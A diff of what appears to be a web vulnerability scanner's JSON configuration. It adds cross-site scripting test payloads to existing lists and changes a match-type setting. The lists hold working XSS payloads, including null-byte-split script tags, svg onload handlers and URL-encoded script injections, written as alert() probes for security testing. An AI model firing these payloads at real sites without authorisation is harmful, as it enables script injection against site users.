@@ -18,7 +18,8 @@
       "true,\u003csc%00ript\u003ealert/**/(1)\u003c/sc%00ript\u003e",
       "true,\u003csc%00ript\u003ealert/**/(1)\u003c/script\u003e",
       "true,\u003csvg onload\u003d\u0027new Function`[\"XSS\"].find(al\\u0065rt)`\u0027\u003e",
-      "true,\u003csvg onx\u003d() onload\u003d(confirm)(1)\u003e"
+      "true,\u003csvg onx\u003d() onload\u003d(confirm)(1)\u003e",
+      "true,%22%26gt%3b%26lt%3bscript%26gt%3balert(%27XSS%27)%26lt%3b/script%26gt%3b%26lt%3b%26%2333%3b%26%2345%3b%26%2345%3b"
     ],
     "Encoder": [],
     "UrlEncode": false,
@@ -35,7 +36,8 @@
       "true,Or,\u003cvideo/poster/onerror\u003dalert(1)\u003e",
       "true,Or,\u003cscript\u003ealert/**/(1)\u003c/script\u003e",
       "true,Or,\u003csvg onload\u003d\u0027new Function`[\"XSS\"].find(al\\u0065rt)`\u0027\u003e",
-      "true,Or,\u003csvg onx\u003d() onload\u003d(confirm)(1)\u003e"
+      "true,Or,\u003csvg onx\u003d() onload\u003d(confirm)(1)\u003e",
+      "true,Or,\u003cscript\u003ealert(\u0027XSS\u0027)\u003c/script\u003e"
     ],
     "Tags": [
       "All",
@@ -66,7 +68,7 @@
     "isHeaderValue": false,
     "sequence": false,
     "NewHeaders": [],
-    "MatchType": 1,
+    "MatchType": 3,
     "Scope": 0,
     "RedirType": 4,
     "MaxRedir": 3,
